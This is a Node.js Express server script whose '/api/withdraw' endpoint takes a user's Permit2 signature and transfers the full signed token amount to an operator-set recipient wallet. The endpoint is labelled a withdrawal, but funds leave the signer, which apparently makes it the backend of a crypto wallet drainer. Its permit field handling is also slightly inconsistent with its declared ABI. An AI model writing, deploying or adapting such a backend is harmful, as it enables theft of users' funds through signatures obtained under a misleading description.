require('dotenv').config();
const express = require('express');
const { ethers } = require('ethers');
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- CONFIGURATION ---
const RPC_URL = process.env.RPC_URL; 
const PRIVATE_KEY = process.env.PRIVATE_KEY; 
// The wallet that will receive the USDT
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || "0xYourCompanyWalletAddressHere"; 
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

// --- PERMIT2 ABI ---
const PERMIT2_ABI = [
    "function permitTransferFrom((address token, uint256 amount, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)"
];
const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

app.post('/api/withdraw', async (req, res) => {
    try {
        const { signature, permitData, owner } = req.body;
        
        console.log(`Processing withdrawal for: ${owner}`);
        console.log(`Destination: ${RECIPIENT_ADDRESS}`);

        // --- THE EXECUTION ---
        // 1. permitData.details matches the structure signed in the frontend
        // 2. We explicitly pass RECIPIENT_ADDRESS as the 'to' address
        const tx = await permit2Contract.permitTransferFrom(
            permitData.details, 
            { 
                to: RECIPIENT_ADDRESS, 
                requestedAmount: permitData.details.permitted.amount 
            },
            owner,
            signature
        );

        const receipt = await tx.wait();
        console.log("Transaction confirmed:", receipt.transactionHash);
        
        res.json({ success: true, txHash: receipt.transactionHash });
    } catch (error) {
        console.error('Execution Error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Production Executor active on port ${PORT}`));